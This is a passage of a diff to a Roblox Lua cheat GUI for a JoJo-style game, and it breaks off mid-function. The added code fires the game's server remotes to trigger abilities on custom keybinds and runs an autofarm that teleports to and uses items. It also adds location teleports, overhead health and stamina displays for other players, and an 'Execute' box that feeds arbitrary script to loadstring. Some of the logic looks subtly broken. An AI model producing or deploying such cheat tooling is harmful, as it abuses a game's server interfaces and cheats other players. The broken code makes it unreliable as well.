+local function CTRBNEI_fake_script() -- _15SecondTSButton.ButtonManager 
 	local script = Instance.new('LocalScript', _15SecondTSButton)
 
 	local on = false
 	local off = true
 	local ESB = script.Parent
+	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	
+	local function getKeyCodeFromString(keyString)
+		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
+		if keyName then
+			local keyCode = Enum.KeyCode[keyName]
+			if keyCode then
+				return keyCode
+			else
+				error(keyName .. " is not a valid KeyCode")
+			end
+		else
+			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
+		end
+	end
+	
+	while not KEYBIND:match("Enum%.KeyCode%.") do
+		wait(0.1)
+		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	end
+	
+	local keyCode = getKeyCodeFromString(KEYBIND)
 	
 	ESB.Activated:Connect(function()
 		if off == true then
@@ -1335,10 +1864,11 @@ local function EFIO_fake_script() -- _15SecondTSButton.ButtonManager
 			off = false
 			print("15 SECOND TS ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
-			
+	
 			game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
 				if on == true and not gameProcessed then
-					if input.KeyCode == Enum.KeyCode.LeftControl then
+					if input.KeyCode == keyCode then
+						print("BOOM!!!")
 						local args = {
 							[1] = 15,
 							[2] = "diego"
@@ -1347,7 +1877,7 @@ local function EFIO_fake_script() -- _15SecondTSButton.ButtonManager
 					end
 				end
 			end)
-			
+	
 		elseif on == true then
 			on = false
 			off = true
@@ -1355,122 +1885,205 @@ local function EFIO_fake_script() -- _15SecondTSButton.ButtonManager
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
+	
 end
-coroutine.wrap(EFIO_fake_script)()
-local function UKUOMP_fake_script() -- AntiTSButton.ButtonManager 
-	local script = Instance.new('LocalScript', AntiTSButton)
+coroutine.wrap(CTRBNEI_fake_script)()
+local function DNXZV_fake_script() -- Keybind.ReturnToOrigin 
+	local script = Instance.new('LocalScript', Keybind)
+
+	local textBox = script.Parent
+	
+	while wait() do
+		local text = textBox.Text
+	
+		if text == "" then
+			wait(1.5)
+			textBox.Text = "Keybind here."
+		elseif text == "b" or text == "B" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.B"
+		elseif text == "c" or text == "C" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.C"
+		elseif text == "e" or text == "E" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.E"
+		elseif text == "f" or text == "F" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F"
+		elseif text == "g" or text == "G" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.G"
+		elseif text == "h" or text == "H" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.H"
+		elseif text == "i" or text == "I" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.I"
+		elseif text == "j" or text == "J" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.J"
+		elseif text == "k" or text == "K" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.K"
+		elseif text == "l" or text == "L" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.L"
+		elseif text == "m" or text == "M" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.M"
+		elseif text == "n" or text == "N" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.N"
+		elseif text == "o" or text == "O" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.O"
+		elseif text == "p" or text == "P" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.P"
+		elseif text == "q" or text == "Q" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Q"
+		elseif text == "r" or text == "R" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.R"
+		elseif text == "t" or text == "T" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.T"
+		elseif text == "u" or text == "U" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.U"
+		elseif text == "v" or text == "V" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.V"
+		elseif text == "x" or text == "X" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.X"
+		elseif text == "y" or text == "Y" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Y"
+		elseif text == "z" or text == "Z" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Z"
+		elseif text == "1" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.One"
+		elseif text == "2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Two"
+		elseif text == "3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Three"
+		elseif text == "4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Four"
+		elseif text == "5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Five"
+		elseif text == "6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Six"
+		elseif text == "7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Seven"
+		elseif text == "8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Eight"
+		elseif text == "9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Nine"
+		elseif text == "0" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Zero"
+		elseif text == "F1" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F1"
+		elseif text == "F2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F2"
+		elseif text == "F3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F3"
+		elseif text == "F4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F4"
+		elseif text == "F5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F5"
+		elseif text == "F6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F6"
+		elseif text == "F7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F7"
+		elseif text == "F8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F8"
+		elseif text == "F9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F9"
+		elseif text == "F10" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F10"
+		elseif text == "F11" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F11"
+		elseif text == "F12" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F12"
+		end
+	end
+	
+	
+end
+coroutine.wrap(DNXZV_fake_script)()
+local function KKCKEN_fake_script() -- AntiTEButton.ButtonManager 
+	local script = Instance.new('LocalScript', AntiTEButton)
 
 	local on = false
 	local off = true
 	local ESB = script.Parent
 	
 	ESB.Activated:Connect(function()
-		
+	
 		if off == true then
 			on = true
 			off = false
-			print("ANTI TS ON")
+			print("ANTI TE ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
-			
-			local ReplicatedStorage = game:GetService("ReplicatedStorage")
-			local Players = game:GetService("Players")
-	
-			local timeStopStartedEvent = Instance.new("BindableEvent")
-			local timeStopEndedEvent = Instance.new("BindableEvent")
-	
-			local anchorRemote = ReplicatedStorage:WaitForChild("Anchor")
-	
-			local function getBaseParts(root)
-				local parts = {}
-				local function scan(obj)
-					for _, child in ipairs(obj:GetChildren()) do
-						if child:IsA("BasePart") then
-							table.insert(parts, child)
-						end
-						if #child:GetChildren() > 0 then
-							scan(child)
+	while on == true do
+		wait(0.3)
+			local function setCharacterTransparency(character, transparency)
+				if character then
+					for _, part in ipairs(character:GetDescendants()) do
+						if part:IsA("BasePart") then
+							part.Transparency = transparency
 						end
 					end
 				end
-				if root and root:IsDescendantOf(game) then
-					scan(root)
-				end
-				return parts
 			end
 	
-			local function setAnchorState(parts, state)
-				for _, part in ipairs(parts) do
-					if part and part:IsDescendantOf(game) then
-						pcall(function()
-							anchorRemote:FireServer(part, state)
-						end)
-					end
+			local function setAllPlayersTransparency(transparency)
+				local players = game:GetService("Players")
+	
+				for _, player in ipairs(players:GetPlayers()) do
+					local character = player.Character or player.CharacterAdded:Wait()
+					setCharacterTransparency(character, transparency)
 				end
 			end
 	
-			local running = false
-			local antiTsConnection
-	
-			local function startAntiTs()
-				if running then return end
-				running = true
-	
-				antiTsConnection = task.spawn(function()
-					while running do
-						local player = Players.LocalPlayer
-						if not player then task.wait(0.5) continue end
-	
-						local character = player.Character or player.CharacterAdded:Wait()
-						if character then
-							local charParts = getBaseParts(character)
-							setAnchorState(charParts, false)
-	
-							local stand = character:FindFirstChild("Stand")
-							if stand then
-								local standParts = getBaseParts(stand)
-								setAnchorState(standParts, false)
-							end
-						end
-	
-						task.wait(0.5)
-					end
-				end)
-			end
-	
-			local function stopAntiTs()
-				running = false
-			end
-	
-			Players.LocalPlayer.CharacterAdded:Connect(function()
-				if running then return end
-				startAntiTs()
-			end)
-			while on == true do
-				wait()
-			timeStopStartedEvent.Event:Connect(startAntiTs)
-			timeStopEndedEvent.Event:Connect(stopAntiTs)
-			end
-			
-			task.delay(5, function()
-				timeStopStartedEvent:Fire()
-			end)
-	
-			task.delay(15, function()
-				timeStopEndedEvent:Fire()
-			end)
-			
-			
-			
+			setAllPlayersTransparency(0)
+		end
 		elseif on == true then
 			on = false
 			off = true
-			print("ANTI TS OFF")
+			print("ANTI TE OFF")
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
 end
-coroutine.wrap(UKUOMP_fake_script)()
-local function PCMXGEQ_fake_script() -- BlockGlitch_2.ButtonManager 
+coroutine.wrap(KKCKEN_fake_script)()
+local function CNTDTH_fake_script() -- BlockGlitch_2.ButtonManager 
 	local script = Instance.new('LocalScript', BlockGlitch_2)
 
 	local on = false
@@ -1478,7 +2091,7 @@ local function PCMXGEQ_fake_script() -- BlockGlitch_2.ButtonManager
 	local ESB = script.Parent
 	
 	ESB.Activated:Connect(function()
-		
+	
 		if off == true then
 			on = true
 			off = false
@@ -1494,46 +2107,46 @@ local function PCMXGEQ_fake_script() -- BlockGlitch_2.ButtonManager
 				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
 				wait(0.1)
 			end
-			
+	
 		elseif on == true then
 			on = false
 			off = true
-				local args = {
-					[1] = "Alternate",
-					[2] = "Block",
-					[3] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+			local args = {
+				[1] = "Alternate",
+				[2] = "Block",
+				[3] = false
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
 			print("BLOCK BUG OFF")
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
 end
-coroutine.wrap(PCMXGEQ_fake_script)()
-local function FWOFGU_fake_script() -- Execute.LocalScript 
+coroutine.wrap(CNTDTH_fake_script)()
+local function AMZZZF_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(script.Parent.Parent.TextBox.Text)
 	end)
 end
-coroutine.wrap(FWOFGU_fake_script)()
-local function GWBW_fake_script() -- Clear.LocalScript 
+coroutine.wrap(AMZZZF_fake_script)()
+local function HKDSAB_fake_script() -- Clear.LocalScript 
 	local script = Instance.new('LocalScript', Clear)
 
 	script.Parent.Activated:Connect(function()
 		script.Parent.Parent.TextBox.Text = "--WRITE YOUR SCRIPT"
 	end)
 end
-coroutine.wrap(GWBW_fake_script)()
-local function WMWOQ_fake_script() -- Welcome.LocalScript 
+coroutine.wrap(HKDSAB_fake_script)()
+local function EESMOQA_fake_script() -- Welcome.LocalScript 
 	local script = Instance.new('LocalScript', Welcome)
 
 	local lp = game.Players.LocalPlayer
 	script.Parent.Text = "Welcome, "..lp.Name.."!"
 end
-coroutine.wrap(WMWOQ_fake_script)()
-local function NBLC_fake_script() -- Quote.LocalScript 
+coroutine.wrap(EESMOQA_fake_script)()
+local function INJN_fake_script() -- Quote.LocalScript 
 	local script = Instance.new('LocalScript', Quote)
 
 	local numbers = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
@@ -1562,8 +2175,8 @@ local function NBLC_fake_script() -- Quote.LocalScript
 		script.Parent.Text = "Ready to kill?"
 	end
 end
-coroutine.wrap(NBLC_fake_script)()
-local function ARKKGG_fake_script() -- TextBox_2.EnsureConstantInvite 
+coroutine.wrap(INJN_fake_script)()
+local function JLIB_fake_script() -- TextBox_2.EnsureConstantInvite 
 	local script = Instance.new('LocalScript', TextBox_2)
 
 	while wait(0.1) do
@@ -1572,8 +2185,8 @@ local function ARKKGG_fake_script() -- TextBox_2.EnsureConstantInvite
 		end
 	end
 end
-coroutine.wrap(ARKKGG_fake_script)()
-local function PFRKRXV_fake_script() -- STWRTZButton.ButtonManager 
+coroutine.wrap(JLIB_fake_script)()
+local function CIUHI_fake_script() -- STWRTZButton.ButtonManager 
 	local script = Instance.new('LocalScript', STWRTZButton)
 
 	local on = false
@@ -1635,8 +2248,8 @@ local function PFRKRXV_fake_script() -- STWRTZButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(PFRKRXV_fake_script)()
-local function PUFRFC_fake_script() -- STWRTZButton_2.ButtonManager 
+coroutine.wrap(CIUHI_fake_script)()
+local function DYPAKC_fake_script() -- STWRTZButton_2.ButtonManager 
 	local script = Instance.new('LocalScript', STWRTZButton_2)
 
 	local on = false
@@ -1689,8 +2302,8 @@ local function PUFRFC_fake_script() -- STWRTZButton_2.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(PUFRFC_fake_script)()
-local function DTEJHM_fake_script() -- D4CClonesButton.ButtonManager 
+coroutine.wrap(DYPAKC_fake_script)()
+local function IBBY_fake_script() -- D4CClonesButton.ButtonManager 
 	local script = Instance.new('LocalScript', D4CClonesButton)
 
 	local on = false
@@ -1781,9 +2394,9 @@ local function DTEJHM_fake_script() -- D4CClonesButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(DTEJHM_fake_script)()
-local function LCVAE_fake_script() -- ESplashButton.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton)
+coroutine.wrap(IBBY_fake_script)()
+local function ADYYHUY_fake_script() -- InvisStandButton.ButtonManager 
+	local script = Instance.new('LocalScript', InvisStandButton)
 
 	local on = false
 	local off = true
@@ -1793,63 +2406,167 @@ local function LCVAE_fake_script() -- ESplashButton.ButtonManager
 		if off == true then
 			on = true
 			off = false
-			print("EMERALD SPLASH ON")
+			print("INVISIBLE STAND ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+				wait()
+				local args = {
+					"Alternate",
+					"Appear",
+					true
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+	
+			end
 		elseif on == true then
 			on = false
 			off = true
-			print("EMERALD SPLASH OFF")
+			local args = {
+				"Alternate",
+				"Appear",
+				false
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+			print("INVISIBLE STAND OFF")
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
 end
-coroutine.wrap(LCVAE_fake_script)()
-local function MTTWZB_fake_script() -- ESplashButton_2.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_2)
+coroutine.wrap(ADYYHUY_fake_script)()
+local function KQAQV_fake_script() -- AutofarmButton.ButtonManager 
+	local script = Instance.new('LocalScript', AutofarmButton)
 
+	local ESB = script.Parent
 	local on = false
 	local off = true
-	local ESB = script.Parent
+	local toggleConnection
+	local UIS = game:GetService("UserInputService")
 	
 	ESB.Activated:Connect(function()
 		if off == true then
 			on = true
 			off = false
-			print("EMERALD SPLASH ON")
+			print("AUTOFARM ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
-		elseif on == true then
-			on = false
-			off = true
-			print("EMERALD SPLASH OFF")
-			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
-		end
-	end)
-end
-coroutine.wrap(MTTWZB_fake_script)()
-local function OUORUY_fake_script() -- VTWKnifeButton.ButtonManager 
-	local script = Instance.new('LocalScript', VTWKnifeButton)
-
-	local on = false
-	local off = true
-	local ESB = script.Parent
+			local UserInputService = game:GetService("UserInputService")
+			local player = game.Players.LocalPlayer
+			local debounceTime = 600
 	
-	ESB.Activated:Connect(function()
-		if off == true then
-			on = true
-			off = false
-			print("EMERALD SPLASH ON")
-			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			local function simulateKeyPress()
+				local inputObject = Instance.new("InputObject")
+				inputObject.UserInputType = Enum.UserInputType.Keyboard
+				inputObject.KeyCode = Enum.KeyCode.W
+				UserInputService.InputBegan:Fire(inputObject, false)
+				wait(0.1)
+				UserInputService.InputEnded:Fire(inputObject)
+			end
+	
+			while on == true do
+				-- Simulate key press
+				simulateKeyPress()
+	
+				-- Check for Arrow tool
+				local arrowTool = player.Character:FindFirstChild("Arrow") or player.Backpack:FindFirstChild("Arrow")
+				local rokakaFruitTool = player.Character:FindFirstChild("Rokaka Fruit") or player.Backpack:FindFirstChild("Rokaka Fruit")
+	
+				if not arrowTool then
+					local arrowInBackpack = player.Backpack:FindFirstChild("Arrow")
+					if arrowInBackpack then
+						arrowInBackpack.Parent = player.Character
+					else
+						local arrowInWorkspace = workspace:FindFirstChild("Arrow")
+						if arrowInWorkspace and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+							player.Character.HumanoidRootPart.CFrame = arrowInWorkspace.Handle.CFrame
+							player.Character.HumanoidRootPart.CFrame = CFrame.new(2116, 670, -519)
+						end
+					end
+				end
+	
+				if not rokakaFruitTool then
+					local rokakaFruitInBackpack = player.Backpack:FindFirstChild("Rokaka Fruit")
+					if rokakaFruitInBackpack then
+						rokakaFruitInBackpack.Parent = player.Character
+					else
+						local rokakaFruitInWorkspace = workspace:FindFirstChild("Rokaka Fruit")
+						if rokakaFruitInWorkspace and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+							player.Character.HumanoidRootPart.CFrame = rokakaFruitInWorkspace.Handle.CFrame
+							player.Character.HumanoidRootPart.CFrame = CFrame.new(2116, 670, -519)
+						end
+					end
+				end
+	
+				local standValue = player.Data.Stand.Value
+				local targetStandValue = script.Parent.Parent.TextLabel.Stand.Text
+	
+				if player.Character:FindFirstChild("Arrow") and standValue == 1 and standValue ~= targetStandValue then
+					game:GetService("ReplicatedStorage"):WaitForChild("ItemEvents"):WaitForChild("Arrow"):FireServer()
+				end
+	
+				if player.Character:FindFirstChild("Rokaka Fruit") and standValue == 1 and standValue ~= targetStandValue then
+					game:GetService("ReplicatedStorage"):WaitForChild("ItemEvents"):WaitForChild("Roka"):FireServer()
+				end
+	
+				wait(1.5)
+			end
+	
 		elseif on == true then
 			on = false
 			off = true
-			print("EMERALD SPLASH OFF")
+			print("AUTOFARM OFF")
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
+	
 end
-coroutine.wrap(OUORUY_fake_script)()
-local function LUSIJ_fake_script() -- ESplashButton_3.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_3)
+coroutine.wrap(KQAQV_fake_script)()
+local function IZCMGXO_fake_script() -- Stand.ReturnToOrigin 
+	local script = Instance.new('LocalScript', Stand)
+
+	local textBox = script.Parent
+	
+	local stands = {
+		[1] = "Standless",
+		[2] = "SP",
+		[3] = "SPSO",
+		[6969] = "SPTW",
+		[4] = "TW",
+		[5] = "CD",
+		[6] = "KQ",
+		[7] = "GE",
+		[10] = "DKC",
+		[11] = "TWAU",
+		[14] = "OMT",
+		[18] = "Anubis",
+		[19] = "HG",
+		[25] = "S&W",
+		[27] = "KCAU",
+		[30] = "S&WShiny",
+		[34] = "SF",
+		[44] = "D4C",
+		[52] = "WS",
+		[60] = "WSAU",
+		[10004] = "TWOVA"
+	}
+	
+	while wait() do
+		local text = textBox.Text
+	
+		if text == "" then
+			wait(1.5)
+			textBox.Text = "Stand here."
+		elseif stands[text] then
+			wait(1.5)
+			textBox.Text = stands[text]
+		else
+			wait(1.5)
+			textBox.Text = "Invalid input."
+		end
+	end
+	
+end
+coroutine.wrap(IZCMGXO_fake_script)()
+local function NVBC_fake_script() -- HealthBarsButton.ButtonManager 
+	local script = Instance.new('LocalScript', HealthBarsButton)
 
 	local ESB = script.Parent
 	local on = false
@@ -1860,12 +2577,551 @@ local function LUSIJ_fake_script() -- ESplashButton_3.ButtonManager
 		if off == true then
 			on = true
 			off = false
-			print("EMERALD SPLASH ON")
+			print("HEALTH BARS ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+				local TweenService = game:GetService("TweenService")
+				local Players = game:GetService("Players")
+	
+				local function createOrUpdateStaminaGui(character, staminaValue)
+					local head = character:FindFirstChild("Head")
+					if not head then return end
+	
+					local existingGui = character:FindFirstChild("StaminaGui")
+					local textLabel
+	
+					if existingGui then
+						textLabel = existingGui:FindFirstChild("TextLabel")
+					else
+						local billboardGui = Instance.new("BillboardGui", head)
+						billboardGui.Name = "StaminaGui"
+						billboardGui.Size = UDim2.new(0, 150, 0, 50)
+						billboardGui.StudsOffset = Vector3.new(0, 8, 0)
+						billboardGui.AlwaysOnTop = true
+	
+						textLabel = Instance.new("TextLabel", billboardGui)
+						textLabel.Size = UDim2.new(1, 0, 1, 0)
+						textLabel.BackgroundTransparency = 0
+						textLabel.BackgroundColor3 = Color3.new(0, 0, 1)
+						textLabel.TextColor3 = Color3.new(1, 1, 1)
+						textLabel.TextScaled = true
+						textLabel.Font = Enum.Font.SourceSansBold
+					end
+	
+					textLabel.Text = "Stamina: " .. staminaValue
+				end
+	
+				local function getPlayerStamina(player)
+					local playerPart = game.Workspace:FindFirstChild(player.Name)
+					if playerPart then
+						local maxStamina = playerPart:FindFirstChild("MaxStamina")
+						if maxStamina then
+							local stamina = maxStamina:FindFirstChild("Stamina")
+							return stamina and stamina.Value or nil
+						end
+					end
+					return nil
+				end
+	
+				local function createBillboardGui(character)
+					local humanoid = character:WaitForChild("Humanoid")
+					local player = Players:GetPlayerFromCharacter(character)
+					local staminaValue = getPlayerStamina(player)
+	
+					if staminaValue then
+						createOrUpdateStaminaGui(character, staminaValue)
+						return
+					end
+	
+					local billboardGui = Instance.new("BillboardGui", character.Head)
+					billboardGui.Size = UDim2.new(0, 200, 0, 50)
+					billboardGui.StudsOffset = Vector3.new(0, 3, 0)
+	
+					local textLabel = Instance.new("TextLabel", billboardGui)
+					textLabel.Size = UDim2.new(1, 0, 1, 0)
+					textLabel.BackgroundTransparency = 1
+					textLabel.TextColor3 = Color3.new(1, 1, 1)
+					textLabel.TextScaled = true
+	
+					local function updateHealth()
+						while humanoid and humanoid.Health > 0 do
+							local healthPercentage = (humanoid.Health / humanoid.MaxHealth) * 100
+							textLabel.Text = string.format("Health: %.0f%%", healthPercentage)
+	
+							local color = Color3.new(1 - healthPercentage / 100, healthPercentage / 100, 0)
+							TweenService:Create(textLabel, TweenInfo.new(0.5), {TextColor3 = color}):Play()
+							wait(0.1)
+						end
+					end
+	
+					updateHealth()
+				end
+	
+				Players.PlayerAdded:Connect(function(player)
+					player.CharacterAdded:Connect(createBillboardGui)
+				end)
+	
+				for _, player in ipairs(Players:GetPlayers()) do
+					if player.Character then
+						createBillboardGui(player.Character)
+					end
+				end
+	
+			end
+		elseif on == true then
+			on = false
+			off = true
+			print("HEALTH BARS OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(NVBC_fake_script)()
+local function EKBN_fake_script() -- Tab7_2.LocalScript 
+	local script = Instance.new('LocalScript', Tab7_2)
+
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local teleportLocations = {
+		Middle = Vector3.new(1345, 623, -506),          -- Middle
+		FarmZone = Vector3.new(-285, 511, -1486),       -- Farm Zone
+		BasePlate = Vector3.new(-96, 25, -580),         -- Base Plate
+		ZeldaMoon = Vector3.new(1346, 2208, 746),       -- Zelda Moon
+		LoadingScreen = Vector3.new(2116, 670, -519),   -- Loading Screen
+		StandChangerNpc = Vector3.new(1397, 590, -218), -- Stand Changer Npc
+		ArenaLeft = Vector3.new(1316, 633, -280),       -- Arena Left
+		ArenaRight = Vector3.new(1178, 633, -280),      -- Arena Right
+		RachaelHouse = Vector3.new(1037, 633, -183),    -- Rachael House
+		Waterfall = Vector3.new(1628, 623, -747),       -- Waterfall
+		BossEntrance = Vector3.new(1124, 624, -741),    -- Boss Entrance
+		D4C = Vector3.new(-3092, 500, -440)              -- D4C
+	}
+	
+	local function teleportTo(coords)
+		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+		humanoidRootPart.CFrame = CFrame.new(coords)
+	end
+	
+	local TPButtonMiddle = script.Parent.TPButtonMiddle
+	TPButtonMiddle.Activated:Connect(function() teleportTo(teleportLocations.Middle) end)
+	
+	local TPButtonFarmZone = script.Parent.TPButtonFarmZone
+	TPButtonFarmZone.Activated:Connect(function() teleportTo(teleportLocations.FarmZone) end)
+	
+	local TPButtonBasePlate = script.Parent.TPButtonBasePlate
+	TPButtonBasePlate.Activated:Connect(function() teleportTo(teleportLocations.BasePlate) end)
+	
+	local TPButtonZeldaMoon = script.Parent.TPButtonZeldaMoon
+	TPButtonZeldaMoon.Activated:Connect(function() teleportTo(teleportLocations.ZeldaMoon) end)
+	
+	local TPButtonLoadingScreen = script.Parent.TPButtonLoadingScreen
+	TPButtonLoadingScreen.Activated:Connect(function() teleportTo(teleportLocations.LoadingScreen) end)
+	
+	local TPButtonStandChangerNpc = script.Parent.TPButtonStandChangerNpc
+	TPButtonStandChangerNpc.Activated:Connect(function() teleportTo(teleportLocations.StandChangerNpc) end)
+	
+	local TPButtonArenaLeft = script.Parent.TPButtonArenaLeft
+	TPButtonArenaLeft.Activated:Connect(function() teleportTo(teleportLocations.ArenaLeft) end)
+	
+	local TPButtonArenaRight = script.Parent.TPButtonArenaRight
+	TPButtonArenaRight.Activated:Connect(function() teleportTo(teleportLocations.ArenaRight) end)
+	
+	local TPButtonRachaelHouse = script.Parent.TPButtonRachaelHouse
+	TPButtonRachaelHouse.Activated:Connect(function() teleportTo(teleportLocations.RachaelHouse) end)
+	
+	local TPButtonWaterfall = script.Parent.TPButtonWaterfall
+	TPButtonWaterfall.Activated:Connect(function() teleportTo(teleportLocations.Waterfall) end)
+	
+	local TPButtonBossEntrance = script.Parent.TPButtonBossEntrance
+	TPButtonBossEntrance.Activated:Connect(function() teleportTo(teleportLocations.BossEntrance) end)
+	
+	local TPButtonD4C = script.Parent.TPButtonD4C
+	TPButtonD4C.Activated:Connect(function() teleportTo(teleportLocations.D4C) end)
+end
+coroutine.wrap(EKBN_fake_script)()
+local function RHAT_fake_script() -- VTWKnifeButton.ButtonManager 
+	local script = Instance.new('LocalScript', VTWKnifeButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local UIS = game:GetService("UserInputService")
+	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	
+	local function getKeyCodeFromString(keyString)
+		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
+		if keyName then
+			local keyCode = Enum.KeyCode[keyName]
+			if keyCode then
+				return keyCode
+			else
+				error(keyName .. " is not a valid KeyCode")
+			end
+		else
+			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
+		end
+	end
+	
+	while not KEYBIND:match("Enum%.KeyCode%.") do
+		wait(0.1)
+		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	end
+	
+	local keyCode = getKeyCodeFromString(KEYBIND)
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("VTW KNIFE ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+	
 			while on == true do
 				wait()
 				UIS.InputBegan:Connect(function(ip, gpe)
-					if ip.KeyCode == Enum.KeyCode.LeftControl then
+					if ip.KeyCode == keyCode then
+						local player = game.Players.LocalPlayer
+						local mouse = player:GetMouse()
+	
+						local args = {
+							"Alternate",
+							"Knife",
+							vector.create(mouse.Hit.p.x, mouse.Hit.p.y, mouse.Hit.p.z)
+						}
+	
+						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+					end
+				end)
+			end
+			while on == true do
+				UIS.InputBegan:Connect(function(ip, gpe)
+					if ip.KeyCode == Enum.KeyCode.K then
+						game.Workspace.Effects:ClearAllChildren()
+					end
+				end)
+			end
+		elseif on == true then
+			on = false
+			off = true
+			print("VTW KNIFE OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(RHAT_fake_script)()
+local function KBXRNS_fake_script() -- Keybind_2.ReturnToOrigin 
+	local script = Instance.new('LocalScript', Keybind_2)
+
+	local textBox = script.Parent
+	
+	while wait() do
+		local text = textBox.Text
+	
+		if text == "" then
+			wait(1.5)
+			textBox.Text = "Keybind here."
+		elseif text == "b" or text == "B" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.B"
+		elseif text == "c" or text == "C" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.C"
+		elseif text == "e" or text == "E" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.E"
+		elseif text == "f" or text == "F" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F"
+		elseif text == "g" or text == "G" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.G"
+		elseif text == "h" or text == "H" then
